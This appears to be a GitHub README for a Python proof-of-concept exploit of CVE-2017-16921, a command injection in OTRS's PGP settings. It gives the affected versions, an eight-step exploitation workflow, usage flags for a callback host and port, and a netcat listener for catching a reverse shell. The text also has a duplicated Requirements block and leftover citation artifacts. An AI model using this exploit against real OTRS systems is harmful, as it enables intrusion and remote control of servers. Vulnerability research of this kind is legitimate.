# OTRS 4.0.1 – 6.0.1 Remote Command Execution (CVE‑2017‑16921)

![Python](https://img.shields.io/badge/language-python-blue)
![Exploit](https://img.shields.io/badge/type-RCE-red)
![Status](https://img.shields.io/badge/status-POC-green)
![License](https://img.shields.io/badge/license-Research-lightgrey)

Proof‑of‑Concept exploit for **CVE‑2017‑16921**, a Remote Command Execution vulnerability affecting multiple versions of **OTRS (Open Ticket Request System)**.

This script automates authentication to the OTRS agent interface and abuses a flaw in the **PGP configuration form parameters** to execute arbitrary commands on the target system.

The exploit can be used to obtain a **reverse shell** from vulnerable OTRS installations.

---

# Overview

OTRS is a widely used open‑source helpdesk and ticket management system used by organizations to handle support requests.

A vulnerability exists in several OTRS versions where **form parameters related to the PGP configuration interface are not properly sanitized**.

An attacker authenticated as an **OTRS agent** can manipulate these parameters to inject system commands that are executed by the server.

This repository provides a Python implementation that demonstrates exploitation of this vulnerability.

---

# Vulnerability Information

| Field | Value |
|------|------|
| CVE | CVE-2017-16921 |
| Vulnerability Type | Command Injection |
| Impact | Remote Command Execution |
| Privileges Required | Authenticated (Agent) |
| CVSS Score | High |
| CWE | CWE-78 (OS Command Injection) |

The vulnerability allows an authenticated attacker to execute arbitrary shell commands with the privileges of the **OTRS service user or the web server user**. :contentReference[oaicite:0]{index=0}

---

# Affected Versions

The following OTRS versions are vulnerable:

- OTRS **4.0.x ≤ 4.0.26**
- OTRS **5.0.x ≤ 5.0.24**
- OTRS **6.0.x ≤ 6.0.1**

If the application is not patched, an attacker with agent credentials can exploit the vulnerability. :contentReference[oaicite:1]{index=1}

---

# Exploitation Workflow

The exploit follows these steps:

1. Connect to the OTRS login panel.
2. Authenticate using valid **agent credentials**.
3. Extract the required **session cookies**.
4. Retrieve the **ChallengeToken** required for authenticated requests.
5. Access the **PGP configuration endpoint**.
6. Inject a malicious command through vulnerable parameters.
7. Trigger execution on the server.
8. Establish a **reverse shell connection**.

---

# Features

- Automated login to the OTRS agent panel
- Automatic retrieval of **ChallengeToken**
- Command injection via vulnerable parameters
- Reverse shell support
- Lightweight Python implementation
- Minimal external dependencies

---

# Repository Structure

├── CVE-2017-16921.py
└── README.md

| File | Description |
|-----|-------------|
| CVE-2017-16921.py | Python exploit script |
| README.md | Documentation |

---

# Requirements

The exploit requires:

- Python **3.x**
- Python `requests` module
- Valid **OTRS agent credentials**
- Network access to the target server

Install dependencies:

```bash

## Requirements

The exploit requires:

- Python 3.x
- Python `requests` module
- Valid **OTRS agent credentials**
- Network access to the target server

Install dependencies:

```bash
pip3 install requests
```

---

## Usage

Run the exploit script:

```bash
python3 CVE-2017-16921.py
```

Example usage:

```bash
python3 CVE-2017-16921.py \
--url http://target/otrs/index.pl \
--username agent_user \
--password password \
--lhost 10.10.14.5 \
--lport 4444
```

---

## Reverse Shell Listener

Before executing the exploit, start a listener:

```bash
nc -lvnp 4444
```

If exploitation is successful, the target server will connect back to your listener.
